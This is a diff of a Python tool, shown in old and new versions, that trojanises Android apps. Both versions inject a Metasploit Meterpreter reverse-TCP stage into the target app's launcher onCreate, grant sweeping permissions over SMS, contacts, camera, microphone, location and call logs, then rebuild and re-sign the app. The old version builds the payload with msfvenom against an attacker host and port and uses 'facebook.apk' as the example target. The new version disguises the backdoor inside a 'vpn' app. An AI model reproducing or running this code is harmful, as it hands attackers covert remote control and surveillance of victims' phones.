@@ -1,190 +1,99 @@
-#!/usr/bin/python
+from pathlib import Path
+from lxml import etree
+import re
+import os
 
-import sys
-from random import randint
-import string
-from os import system, mkdir
 
-l = [str(i) for i in range(0,10)] + list(string.ascii_uppercase) + list(string.ascii_lowercase) + [str(i) for i in range(0,10)]
-
-def generate(n):
-	word = ''
-	for i in range(1, n+1):
-		p = randint(0, 1000) % 72
-		word += l[p]
-	return word
-
-class __search__:
-	def __init__(self, source, dest):
-		self.s = source
-		self.d = dest
-		self.found = False
-		self.i_index = 0
-	def _run_(self):
-		if len(self.s) < len(self.d):
+if __name__ == '__main__':
+	appName = 'vpn'
+	os.system("apktool d venom.apk")
+	os.system(f"apktool d {appName}.apk")
+	os.mkdir(f'{appName}/smali/com/x64/')
+	os.mkdir(f'{appName}/smali/com/x64/stage')
+	path1 = Path('venom/smali/com/metasploit/stage')
+	path2 = Path(f'{appName}/smali/com/x64/stage')
+	for filename in path1.iterdir():
+		with open(filename, 'r') as fp:
+			data = fp.read()
+			data = data.replace('metasploit', 'x64')
+			with open(path2 / filename.name, 'w') as out:
+				out.write(data)
+	with open(f'{appName}/AndroidManifest.xml', 'rb') as fp:
+		xml = fp.read()
+	tree = etree.fromstring(xml)
+	activities = tree.xpath('//activity')
+	launcher = ''
+	for activity in activities:
+		if launcher != '':
+			break
+		try:
+			if activity.xpath('intent-filter/action')[0].attrib.values()[0] == 'android.intent.action.MAIN':
+				for key in activity.attrib.keys():
+					if key[key.find('}')+1:] == 'name':
+						launcher = activity.attrib[key]
+						break
+		except:
 			pass
-		elif len(self.s) == len(self.d):
-			if self.s == self.d:
-				self.found = True
-		else:
-			for i in range(0, len(self.s) - len(self.d) + 1):
-				if self.s[i: len(self.d) + i] == self.d:
-					self.found = True
-					self.i_index = i
-					break
 
-# hooks path payload/smali/com/metasploit/stage/
+	path = f'{appName}/smali/' + '/'.join(launcher.split('.')) + '.smali'
+	with open(path, 'r') as fp:
+		Lines = fp.readlines()
 
-class __inject_hooks__:
-	def __init__(self, meta_replace):
-		self.word = meta_replace
-	def run(self):
-		sed_cmd = 'sed -i s/metasploit/' + self.word + '/g payload/smali/com/metasploit/stage/*'
-		system(sed_cmd)
-		mkdir_cmd = "original/smali/com/" + self.word
-		mkdir(mkdir_cmd)
-		mkdir_cmd = "original/smali/com/" + self.word + "/stage"
-		mkdir(mkdir_cmd)
-		system("cp payload/smali/com/metasploit/stage/* " + mkdir_cmd + "/")
-class __get_mainscreen__:
-	def __init__(self):
-		self.mainscreen = ""
-		self.target_line = None
-	def __configure__(self):
-		AndroidManifest = open("original/AndroidManifest.xml", "r")
-		x = None
-		for line in AndroidManifest.readlines():
-			temp_search = __search__(line.strip(), "<activity")
-			temp_search._run_()
-			if temp_search.found:
-				x = line.strip()
-				break
-		AndroidManifest.close()
-		self.target_line = x
-	def __run__(self):
-		android_name_index = __search__(self.target_line, "android:name=")
-		android_name_index._run_()
-		x = self.target_line[len(android_name_index.d) + android_name_index.i_index:]
-		y = x.split("android")[0].split('"')[1]
-		for p in y.split("."):
-			self.mainscreen += p + "/"
-		self.mainscreen = self.mainscreen[:len(self.mainscreen)-1]
+	fp = open(path, 'w')
+	for Line in Lines:
+		fp.write(Line)
+		if Line.find(';->onCreate(Landroid/os/Bundle;)V') > 0:
+			fp.write('invoke-static {p0}, Lcom/x64/stage/Payload;->start(Landroid/content/Context;)V\n')
+			pass
+	fp.close()
 
+	array = [
+		"INTERNET",
+		"ACCESS_WIFI_STATE",
+		"CHANGE_WIFI_STATE",
+		"ACCESS_NETWORK_STATE",
+		"ACCESS_COARSE_LOCATION",
+		"ACCESS_FINE_LOCATION",
+		"READ_PHONE_STATE",
+		"SEND_SMS",
+		"RECEIVE_SMS",
+		"RECORD_AUDIO",
+		"CALL_PHONE",
+		"READ_CONTACTS",
+		"WRITE_CONTACTS",
+		"RECORD_AUDIO",
+		"WRITE_SETTINGS",
+		"CAMERA",
+		"READ_SMS",
+		"WRITE_EXTERNAL_STORAGE",
+		"RECEIVE_BOOT_COMPLETED",
+		"SET_WALLPAPER",
+		"READ_CALL_LOG",
+		"WRITE_CALL_LOG",
+		"WAKE_LOCK"
+	]
 
-class __inject_cmdline__:
-	def __init__(self, meta_replace):
-		self.word = meta_replace
-		tmp = __get_mainscreen__()
-		tmp.__configure__()
-		tmp.__run__()
-		self.main_path = "original/smali/" + tmp.mainscreen
-	def __run__(self):
-		main_file = open(self.main_path + ".smali", "r")
-		tmp_file = open(self.main_path.split("/").pop() + ".smali", "w")
-		for line in main_file.readlines():
-			i = 0
-			temp_search = __search__(line.strip(), ";->onCreate(Landroid/os/Bundle;)V")
-			temp_search._run_()
-			if temp_search.found and i == 0:
-				tmp_file.write(line)
-				tmp_file.write("\n    invoke-static {p0}, Lcom/" + self.word + "/stage/Payload;->start(Landroid/content/Context;)V\n")
-				i = 1
-			else:
-				tmp_file.write(line)
-		main_file.close()
-		tmp_file.close()
-		system("rm " + self.main_path + ".smali")
-		system("mv " + self.main_path.split("/").pop() + ".smali" + " " + self.main_path + ".smali")
-
-def add_permessions():
-	AndroidManifest = open("original/AndroidManifest.xml", "r")
-	tmp_AndroidManifest = open("AndroidManifest.xml", "w")
+	with open(f'{appName}/AndroidManifest.xml', 'r') as fp:
+		Lines = fp.readlines()
+	for Line in Lines:
+		if 'android.permission' in Line:
+			perm = re.findall(r'android\.permission\.([^"]+)', Line)[0]
+			if perm not in array:
+				array.append(perm)
 	i = 0
-	permessions = ['<uses-permission android:name="android.permission.INTERNET"/>' \
-    ,'<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>' \
-    ,'<uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>' \
-    ,'<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>' \
-    ,'<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>' \
-    ,'<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>' \
-    ,'<uses-permission android:name="android.permission.READ_PHONE_STATE"/>' \
-    ,'<uses-permission android:name="android.permission.SEND_SMS"/>' \
-    ,'<uses-permission android:name="android.permission.RECEIVE_SMS"/>' \
-    ,'<uses-permission android:name="android.permission.RECORD_AUDIO"/>' \
-    ,'<uses-permission android:name="android.permission.CALL_PHONE"/>' \
-    ,'<uses-permission android:name="android.permission.READ_CONTACTS"/>' \
-    ,'<uses-permission android:name="android.permission.WRITE_CONTACTS"/>' \
-    ,'<uses-permission android:name="android.permission.RECORD_AUDIO"/>' \
-    ,'<uses-permission android:name="android.permission.WRITE_SETTINGS"/>' \
-    ,'<uses-permission android:name="android.permission.CAMERA"/>' \
-    ,'<uses-permission android:name="android.permission.READ_SMS"/>' \
-    ,'<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>' \
-    ,'<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>' \
-    ,'<uses-permission android:name="android.permission.SET_WALLPAPER"/>' \
-    ,'<uses-permission android:name="android.permission.READ_CALL_LOG"/>' \
-    ,'<uses-permission android:name="android.permission.WRITE_CALL_LOG"/>' \
-    ,'<uses-permission android:name="android.permission.WAKE_LOCK"/>']
-    
-
-	for line in AndroidManifest.readlines():
-		if "<uses-permission android:name=" in line.strip() and i == 0:
-			i = 1
-			for permession in permessions:
-				tmp_AndroidManifest.write("    " + permession + "\n")
-		else:
-			tmp_AndroidManifest.write(line)
-	AndroidManifest.close()
-	tmp_AndroidManifest.close()
-	system("rm original/AndroidManifest.xml && mv AndroidManifest.xml original/")
-
-def main():
-	""" ------------------------- """
-
-	print "Usage:"
-	print "./x-apk.py -h=<ip or host> -p=<port> -x=<original apk>"
-	print "Example:"
-	print "./x-apk.py -h=192.168.1.5 -p=443 -x=facebook.apk"
-class __INFO__:
-		ip = None
-		port = None
-		original_apk = None
-def start():
-	if len(sys.argv) != 4:
-		main()
-		exit(0)
-	else:
-		for option in sys.argv:
-			if option[:3] == "-h=":
-				__INFO__.ip = option[3:]
-			if option[:3] == "-p=":
-				__INFO__.port = option[3:]
-			if option[:3] == "-x=":
-				__INFO__.original_apk = option[3:]
-			else:
-				pass
-	print "\033[92m[*] Generating  Payload ...\033[93m"
-	system("msfvenom -p android/meterpreter/reverse_tcp lhost=" + __INFO__.ip + " lport=" + __INFO__.port + " -o payload.apk")
-	print "\033[92m[*] Decompiling The Original Apk ...\033[93m"
-	system("apktool d -f " + __INFO__.original_apk + " -o original")
-	print "\033[92m[*] Decompiling The Payload ...\033[93m"
-	system("apktool d -f payload.apk -o payload")
-	print "\033[92m[*] Injecting ...\033[93m"
-	injector = __inject_hooks__("sirai")
-	injector.run()
-	injector = __inject_cmdline__("sirai")
-	injector.__run__()
-	add_permessions()
-	print "\033[92m[*] Recompiling ...\033[93m"
-	system("apktool b original")
-	system("rm -rf payload payload.apk")
-	print "\033[92m[+] your key store password: " + generate(10)
-	print "\033[92m[+] Generating keystore ...\033[93m"
-	system("keytool -genkey -v -keystore tmp.keystore -alias sirai -keyalg RSA -keysize 2048 -validity 10000")
-	print "\033[92m[+] Signing The Apk ...\033[93m"
-	system("jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore tmp.keystore original/dist/" + __INFO__.original_apk + " sirai")
-	system("rm tmp.keystore")
-	print "\033[92m[+] path of your backdoored apk -> original/dist/\033[93m"
-start()
-	 
-
-
-
+	written = False
+	fp = open(f'{appName}/AndroidManifest.xml', 'w')
+	while i < len(Lines):
+		if 'uses-permission' in Lines[i]:
+			if not written:
+				for perm in array:
+					fp.write(f'\t<uses-permission android:name="android.permission.{perm}"/>\n')
+				written = True
+			i+=1
+			continue
+		fp.write(Lines[i])
+		i+=1
+	fp.close()
+	os.system(f"apktool b {appName}")
+	sign = f'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore venom.keystore {appName}/dist/{appName}.apk venom -storepass "pwd2020"'
+	os.system(sign)
